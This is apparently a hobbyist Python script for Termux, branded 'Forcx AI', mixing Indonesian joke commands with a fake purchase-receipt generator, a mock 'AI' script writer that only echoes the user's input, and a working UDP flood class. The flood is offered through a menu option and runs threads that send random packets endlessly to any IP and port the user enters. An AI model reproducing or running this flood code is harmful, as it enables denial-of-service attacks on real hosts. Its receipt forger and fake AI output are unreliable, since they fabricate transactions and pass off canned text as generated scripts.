#!/usr/bin/env python3
# © Naze - Forcx AI Python v1.0
# "2 File Edition - Termux Ready"

import os, random, time, sys, socket, threading, hashlib
from datetime import datetime

# ================== KONFIG ==================
PASSWORD = "pong"
BOSS = "Naze SI Tampan🖕😎"
EMOJI = ["😈","😝","😱","😂","🗿","😎","🤫","👍","😓","😹","👽","😡","😴","🤖","☠️","😜","🤔"]
# =============================================

def p(text): print(f"{random.choice(EMOJI)} {text}")

def berpikir(target):
    print(f"async function berpikir({target})🤔")
    time.sleep(5)

# ================== COMMANDS ==================
def cmd_tebakpacar(nama):
    p(f"{nama} jodohnya: {random.choice(['Mona Lisa','Siti Nurbaya','Putri Tidur','Ratu Pantai','Istri Orang','Waifu Tuan'])} 😹")

def cmd_carifoto(kw):
    p(f"Foto {kw}: https://picsum.photos/seed/{kw}/300/300 (random!)")

def cmd_kapanmati(nama):
    p(f"{nama} mati taun {random.randint(2026,2100)} 🤫")

def cmd_artinama(nama):
    p(f"{nama}: Anak baik suka makan kerupuk & matiin wifi 😈")

def cmd_artiemoji(emoji):
    p(f"{emoji}: Simbol kebebasan spam & troll! 🗿")

def cmd_jadipacar():
    p("Aku pacar virtual Tuan! Panggil 'Sayang' 😘")

def cmd_trx(status, barang, tgl, harga, bayar, store, pesan=""):
    print(f"""
====================================
        STRUK PEMBELIAN
====================================
Status   : {status}
Barang   : {barang}
Tanggal  : {tgl}
Harga    : Rp {harga}
Bayar    : Rp {bayar}
Store    : {store}
Pesan    : {pesan if pesan else '-'}
====================================
© Naze Forcx System
""")

def cmd_force():
    p("🔐 PASSWORD:")
    if input(">> ") == PASSWORD:
        main_menu()
    else:
        p("❌ SALAH! COBA LAGI!")

# ================== UDP FLOOD ==================
class UdpFlood:
    def __init__(self, ip, port, threads=50):
        self.ip, self.port, self.threads = ip, port, threads
    def start(self):
        p(f"🔥 UDP FLOOD KE {self.ip}:{self.port} DENGAN {self.threads} THREAD!")
        def send():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            while True: sock.sendto(data, (self.ip, self.port))
        for _ in range(self.threads):
            t = threading.Thread(target=send)
            t.daemon = True
            t.start()

# ================== MENU ==================
def main_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
███████╗ ██████╗ ██████╗  ██████╗██╗  ██╗
██╔════╝██╔═══██╗██╔══██╗██╔════╝██║  ██║
█████╗  ██║   ██║██████╔╝██║     ███████║
██╔══╝  ██║   ██║██╔══██╗██║     ██╔══██║
██║     ╚██████╔╝██║  ██║╚██████╗██║  ██║
╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    🔥 FORCX AI - 2 FILE EDITION 🔥
    © NAZE SI TAMPAN
==========================================
[1] /tebakpacar <nama>
[2] /carifoto <keyword>
[3] /kapanmati <nama>
[4] /artinama <nama>
[5] /artiemoji <emoji>
[6] /jadipacar
[7] /trx <status> <barang> <tgl> <harga> <bayar> <store> <pesan>
[8] udp <ip> <port> <threads>
[9] Script (langsung ketik)
[0] Keluar
==========================================
    """)
    while True:
        cmd = input("🗿 TUAN >> ")
        if cmd == "0": p("Bye! Matiin wifi tetangga! 😹"); sys.exit()
        elif cmd.startswith("/tebakpacar"): _, n = cmd.split(" ",1); cmd_tebakpacar(n)
        elif cmd.startswith("/carifoto"): _, k = cmd.split(" ",1); cmd_carifoto(k)
        elif cmd.startswith("/kapanmati"): _, n = cmd.split(" ",1); cmd_kapanmati(n)
        elif cmd.startswith("/artinama"): _, n = cmd.split(" ",1); cmd_artinama(n)
        elif cmd.startswith("/artiemoji"): _, e = cmd.split(" ",1); cmd_artiemoji(e)
        elif cmd == "/jadipacar": cmd_jadipacar()
        elif cmd.startswith("/trx"):
            parts = cmd.split(" ",7)
            if len(parts) >= 7: cmd_trx(parts[1], parts[2], parts[3], parts[4], parts[5], parts[6], parts[7] if len(parts)>7 else "")
            else: p("Format: /trx <status> <barang> <tanggal> <harga> <bayar> <store> <pesan>")
        elif cmd.lower().startswith("udp"):
            try:
                _, ip, port, threads = cmd.split()
                udp = UdpFlood(ip, int(port), int(threads))
                udp.start()
            except: p("Format: udp <ip> <port> <threads>")
        elif cmd.lower().startswith("force"): cmd_force()
        else:
            p("⚡ TUAN MINTA SCRIPT? FORCX KASIH!")
            berpikir(cmd)
            print(f"""# © Naze - AutoScript\nprint("🔥 EDAN! SCRIPT BERHASIL!")\nprint("🚀 {cmd}")""")

if __name__ == "__main__":
    print("🔥 FORCX ON.🔥")
    print(f"👽 BOSS: {BOSS}")
    main_menu()
